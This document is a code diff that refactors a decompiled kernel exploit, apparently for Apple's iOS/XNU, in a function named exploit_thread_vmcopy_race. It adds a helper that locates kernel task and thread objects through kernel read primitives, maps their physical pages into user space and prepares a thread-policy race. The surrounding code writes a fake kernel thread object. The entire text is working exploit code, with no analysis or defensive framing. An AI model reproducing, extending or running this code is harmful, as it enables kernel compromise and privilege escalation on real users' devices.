@@ -168,6 +168,20 @@ typedef struct VmcopyPackedMemoryEntry
   uint64_t pageInfoTableBase;
 } VmcopyPackedMemoryEntry;
 
+typedef struct VmcopyTargetThreadMapping
+{
+  uint64_t taskKaddr;
+  uint64_t originalThreadPtr;
+  uint64_t threadKaddr;
+  uint64_t threadPageBase;
+  uint64_t threadPageOffset;
+  uint64_t threadPolicyKaddr;
+  vm_address_t mappedTaskPage;
+  vm_address_t mappedThreadPage;
+  vm_address_t mappedThreadObject;
+  __int64 *taskThreadSlot;
+} VmcopyTargetThreadMapping;
+
 enum
 {
   VMCOPY_KREAD_CTX_OFFSET = 8,
@@ -192,6 +206,9 @@ enum
   VMCOPY_CAPTURED_THREAD_OFFSET = 672,
   VMCOPY_MAPPED_THREAD_POLICY_OFFSET = 272,
   VMCOPY_MAPPED_THREAD_NEXT_OFFSET = 296,
+  VMCOPY_MAPPED_THREAD_MAX_PAGE_OFFSET = 0x3EC0,
+  VMCOPY_THREAD_POLICY_BAD_CACHELINE_OFFSET = 0x10,
+  VMCOPY_THREAD_CACHELINE_MASK = 0x3F,
   VMCOPY_THREAD_SPRAY_COUNT = 256,
   VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR = 2,
   VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS = 4,
@@ -680,6 +697,59 @@ static inline void vmcopy_install_final_fake_thread_object(
   kwrite_u64_to_addr(kreadCtx, messageKaddr + 61448LL, messageKaddr + 61408LL);
   uint64_t vtableResult = (*(__int64 (__fastcall **)(__int64))(*(uint64_t *)state + 16LL))(state);
   kwrite_u64_to_addr(kreadCtx, messageKaddr + 61456LL, vtableResult);
+}
+
+static inline bool vmcopy_prepare_target_thread_mapping(
+        __int64 state,
+        __int64 pageInfoKaddr,
+        uint32_t restorePageRef,
+        mem_entry_name_port_t objectHandle,
+        thread_act_t *targetThread,
+        VmcopyTargetThreadMapping *out,
+        __int128 scratch[2])
+{
+  if ( *targetThread )
+    thread_terminate(*targetThread);
+  thread_create(mach_task_self_, targetThread);
+
+  __int64 kreadCtx = *(uint64_t *)(state + VMCOPY_KREAD_CTX_OFFSET);
+  *(uint32_t *)(state + VMCOPY_CAPTURED_THREAD_OFFSET) = 0;
+  out->taskKaddr = get_task_kobject_addr_from_field32(kreadCtx, *targetThread);
+  out->originalThreadPtr = kread_u64_value(kreadCtx, qword_48008 + out->taskKaddr);
+  out->threadKaddr = maybe_sptm_translate_kaddr(
+                       KRWCTX_FROM_RAW_FIELD(kreadCtx, 32),
+                       out->originalThreadPtr);
+
+  if ( ((out->threadKaddr + VMCOPY_MAPPED_THREAD_POLICY_OFFSET) & VMCOPY_THREAD_CACHELINE_MASK) == VMCOPY_THREAD_POLICY_BAD_CACHELINE_OFFSET
+    || (out->threadKaddr & 0x3FFF) > VMCOPY_MAPPED_THREAD_MAX_PAGE_OFFSET )
+  {
+    return false;
+  }
+
+  out->threadPageOffset = out->threadKaddr & 0x3FFF;
+  out->threadPolicyKaddr = out->threadKaddr + VMCOPY_MAPPED_THREAD_POLICY_OFFSET;
+  out->threadPageBase = out->threadKaddr & 0xFFFFFFFFFFFFC000LL;
+  uint32_t mappedPageRef = *(uint32_t *)(state + 32);
+  out->mappedTaskPage = vmcopy_map_physical_page(
+                          kreadCtx,
+                          pageInfoKaddr,
+                          mappedPageRef,
+                          restorePageRef,
+                          objectHandle,
+                          out->taskKaddr & 0xFFFFFFFFFFFFC000LL,
+                          scratch);
+  out->mappedThreadPage = vmcopy_map_physical_page(
+                            kreadCtx,
+                            pageInfoKaddr,
+                            mappedPageRef,
+                            restorePageRef,
+                            objectHandle,
+                            out->threadPageBase,
+                            scratch);
+  out->mappedThreadObject = out->mappedThreadPage + out->threadPageOffset;
+  out->taskThreadSlot = (__int64 *)(out->mappedTaskPage + (out->taskKaddr & 0x3FFF) + qword_48008);
+
+  return true;
 }
 
 static inline uint64_t vmcopy_page_info_addr_from_ref(uint32_t ref, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
@@ -8318,12 +8388,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 {
   __int64 *v2; // x20
   unsigned __int64 v20; // x27
-  thread_act_t v22; // w1
   unsigned __int64 v23; // x25
-  __int64 v24; // x22
-  unsigned __int64 v25; // x0
-  vm_offset_t v26; // x26
-  vm_address_t v27; // x26
   unsigned __int64 v29; // x22
   __int64 *v35; // x24
   vm_address_t v36; // x28
@@ -8347,8 +8412,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   void *v94; // [xsp+40h] [xbp-6C0h]
   __int64 v95; // [xsp+58h] [xbp-6A8h]
   __int64 v96; // [xsp+98h] [xbp-668h]
-  __int64 v97; // [xsp+A0h] [xbp-660h]
-  vm_address_t v98; // [xsp+A8h] [xbp-658h]
   unsigned __int64 v99; // [xsp+A8h] [xbp-658h]
   __int64 v100; // [xsp+B0h] [xbp-650h]
   mach_vm_address_t v101; // [xsp+B8h] [xbp-648h]
@@ -8367,7 +8430,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   VmcopyRaceThreadBlock raceThreadBlock; // [xsp+2D0h] [xbp-430h] BYREF
   pthread_t v149; // [xsp+310h] [xbp-3F0h] BYREF
   __int64 v150; // [xsp+318h] [xbp-3E8h] BYREF
-  vm_address_t v151; // [xsp+320h] [xbp-3E0h] BYREF
   vm_address_t v152; // [xsp+328h] [xbp-3D8h] BYREF
   thread_act_t target_act; // [xsp+334h] [xbp-3CCh] BYREF
   thread_act_t v154; // [xsp+338h] [xbp-3C8h] BYREF
@@ -8379,6 +8441,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   thread_act_t v162; // [xsp+368h] [xbp-398h] BYREF
   thread_act_t child_act; // [xsp+36Ch] [xbp-394h] BYREF
   uint64_t pageInfoPayload[30]; // [xsp+370h] [xbp-390h] BYREF
+  VmcopyTargetThreadMapping targetMapping; // BYREF
   __int128 __dst[19]; // [xsp+460h] [xbp-2A0h] BYREF
   __int128 v180[16]; // [xsp+590h] [xbp-170h] BYREF
 
@@ -8413,49 +8476,32 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   v94 = (void *)(someStruct + 44);
   do
   {
-    if ( target_act )
-      thread_terminate(target_act);
-    thread_create(mach_task_self_, &target_act);
-    v22 = target_act;
-    *(uint32_t *)(someStruct + 672) = 0;
-    v23 = get_task_kobject_addr_from_field32(*(uint64_t *)(someStruct + 8), v22);
-    v24 = kread_u64_value(*(uint64_t *)(someStruct + 8), qword_48008 + v23);
-    v25 = maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(someStruct + 8), 32), v24);
-    if ( ((v25 + 272) & 0x3F) == 0x10 || (v25 & 0x3FFF) > 0x3EC0 )
+    if ( !vmcopy_prepare_target_thread_mapping(
+            someStruct,
+            v103,
+            v102 >> v159,
+            object_handle,
+            &target_act,
+            &targetMapping,
+            __dst) )
+    {
       goto LABEL_68;
-    v96 = v24;
-    v105 = v25 & 0x3FFF;
-    v100 = v25;
-    v101 = v25 + 272;
-    v26 = v25 & 0xFFFFFFFFFFFFC000LL;
-    v152 = vmcopy_map_physical_page(
-             *(uint64_t *)(someStruct + 8),
-             v103,
-             *(uint64_t *)(someStruct + 32),
-             v102 >> v159,
-             object_handle,
-             v23 & 0xFFFFFFFFFFFFC000LL,
-             __dst);
-    v97 = qword_48008;
-    v98 = v152;
-    v108 = v26;
-    v151 = vmcopy_map_physical_page(
-             *(uint64_t *)(someStruct + 8),
-             v103,
-             *(uint64_t *)(someStruct + 32),
-             v102 >> v159,
-             object_handle,
-             v26,
-             __dst);
-    v27 = v151;
+    }
+    v23 = targetMapping.taskKaddr;
+    v96 = targetMapping.originalThreadPtr;
+    v105 = targetMapping.threadPageOffset;
+    v100 = targetMapping.threadKaddr;
+    v101 = targetMapping.threadPolicyKaddr;
+    v108 = targetMapping.threadPageBase;
+    v152 = targetMapping.mappedTaskPage;
+    v35 = targetMapping.taskThreadSlot;
+    v36 = targetMapping.mappedThreadObject;
     v150 = 0;
     memset(v180, 0, sizeof(v180));
     vmcopy_init_race_thread_block(&raceThreadBlock, &v150, &target_act, v180, v160, semaphore);
     pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
     semaphore_wait(semaphore);
     v29 = vmcopy_set_low_priority_and_find_policy_offset(*v2, v149, policy_info, &v107);
-    v35 = (__int64 *)(v98 + (v23 & 0x3FFF) + v97);
-    v36 = v27 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v29 + v107 + 4, 1);
     vmcopy_prepare_current_thread_policy_race(*v2, v107, policy_info);
     semaphore_signal(v160);
